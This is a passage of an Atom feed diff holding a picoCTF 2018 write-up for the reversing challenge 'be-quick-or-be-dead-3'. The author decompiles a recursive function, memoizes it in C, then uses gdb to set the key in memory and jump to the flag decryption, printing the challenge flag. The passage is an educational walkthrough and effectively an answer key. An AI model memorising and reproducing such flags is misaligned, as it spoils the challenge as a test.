+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;mybinder.org&#x2F;v2&#x2F;gh&#x2F;srikavin&#x2F;ctf-writeups&#x2F;master?filepath=picoctf2018%2Fcircuit123%2Fmain.ipynb&quot;&gt;Jupyter Notebook&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>picoCTF 2018 - be-quick-or-be-dead-3</title>
+		<published>2018-10-16T13:53:29.636+00:00</published>
+		<updated>2018-10-19T00:42:37.752+00:00</updated>
+		<link href="/posts/picoctf-2018-be-quick-or-be-dead-3/" type="text/html"/>
+		<id>/posts/picoctf-2018-be-quick-or-be-dead-3/</id>
+		<content type="html">&lt;h1 id=&quot;problem&quot;&gt;Problem&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;As the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=CTt1vk9nM9c&quot;&gt;song&lt;&#x2F;a&gt; draws closer to the end, another executable 
+&lt;a href=&quot;https:&#x2F;&#x2F;2018shell2.picoctf.com&#x2F;static&#x2F;1da7d7f7d74df19b7bdb54a3294dd930&#x2F;be-quick-or-be-dead-3&quot;&gt;be-quick-or-be-dead-3&lt;&#x2F;a&gt; 
+suddenly pops up. This one requires even faster machines. Can you run it fast enough too?&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;p&gt;After decompiling the program with &lt;a href=&quot;https:&#x2F;&#x2F;derevenets.com&#x2F;&quot;&gt;Snowman&lt;&#x2F;a&gt;, we can see pseudocode for the &lt;code&gt;calc&lt;&#x2F;code&gt; function:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;calc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;edi) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax2;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax3;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax4;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax5;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax6;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; v7;
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        eax2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax4 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax5 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax6 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        v7 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax6 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x1234 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(eax2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(eax4 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax5));
+    } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+        v7 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x2345&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; v7;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;A way to drastically reduce the runtime of a recursive program is to introduce the dynamic programming concept of 
+memoization. It&#x27;s basically just caching the results of each computation. &lt;a href=&quot;https:&#x2F;&#x2F;repl.it&#x2F;repls&#x2F;PerfumedBlissfulMouse&quot;&gt;Here&lt;&#x2F;a&gt;
+is a memoized version of the function:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdio.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;inttypes.h&amp;gt;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; value[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x18e9f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] ;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; exists[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x18e9f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;calc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;edi) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Check if we&amp;#39;ve already done this calculation
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(exists[edi]){
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;If we have, just return the precomputed value
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; value[edi];
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;If not, just continue the calculation
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax2;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax3;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax4;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax5;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax6;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint32_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; v7;
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        eax2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax4 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax5 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        eax6 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;calc(edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+        v7 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax6 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x1234 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(eax2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(eax4 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; eax5));
+    } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+        v7 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; edi &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x2345&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;Store the current result into the memo table
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    value[edi] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; v7;
+    exists[edi] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; v7;
+}
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;%&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; PRIu32 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, calc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x18e9f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;));
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Running this program gives: &lt;code&gt;3610015907&lt;&#x2F;code&gt;.
+Now we need to pass this value to &lt;code&gt;print_flag&lt;&#x2F;code&gt;.
+We can run the program in gdb.
+Using &lt;code&gt;handle SIGALRM ignore&lt;&#x2F;code&gt;, we can avoid the termination of the program if we take too long.
+Looking at the assembly, we can see that the calculated key is set to &lt;code&gt;0x6010b0&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(gdb) disassemble get_key
+Dump of assembler code for function get_key:
+   0x0000000000400815 &amp;lt;+0&amp;gt;:     push   %rbp
+   0x0000000000400816 &amp;lt;+1&amp;gt;:     mov    %rsp,%rbp
+   0x0000000000400819 &amp;lt;+4&amp;gt;:     mov    $0x400a08,%edi
+   0x000000000040081e &amp;lt;+9&amp;gt;:     callq  0x400530 &amp;lt;puts@plt&amp;gt;
+   0x0000000000400823 &amp;lt;+14&amp;gt;:    mov    $0x0,%eax
+   0x0000000000400828 &amp;lt;+19&amp;gt;:    callq  0x400792 &amp;lt;calculate_key&amp;gt;
+   0x000000000040082d &amp;lt;+24&amp;gt;:    mov    %eax,0x20087d(%rip)        # 0x6010b0 &amp;lt;key&amp;gt;
+   0x0000000000400833 &amp;lt;+30&amp;gt;:    mov    $0x400a1b,%edi
+   0x0000000000400838 &amp;lt;+35&amp;gt;:    callq  0x400530 &amp;lt;puts@plt&amp;gt;
+   0x000000000040083d &amp;lt;+40&amp;gt;:    nop
+   0x000000000040083e &amp;lt;+41&amp;gt;:    pop    %rbp
+   0x000000000040083f &amp;lt;+42&amp;gt;:    retq
+End of assembler dump.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So, we need to set that address to &lt;code&gt;3610015907&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;set {int}0x6010b0=3610015907&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;Now we need to skip the call to &lt;code&gt;calculate_key.&lt;&#x2F;code&gt; To do this, we can set a breakpoint right before the call:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;break 0x4008c9&lt;&#x2F;code&gt;, run the program:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;run&lt;&#x2F;code&gt;, then when the breakpoint is triggered, jump to the &lt;code&gt;decrypt_flag&lt;&#x2F;code&gt; call:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(gdb) jump *0x4008d3
+Continuing at 0x4008d3.
+Printing flag:
+picoCTF{dynamic_pr0gramming_ftw_1ffc009d}
+[Inferior 1 (process 31) exited normally]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</content>
+	</entry>
+</feed>
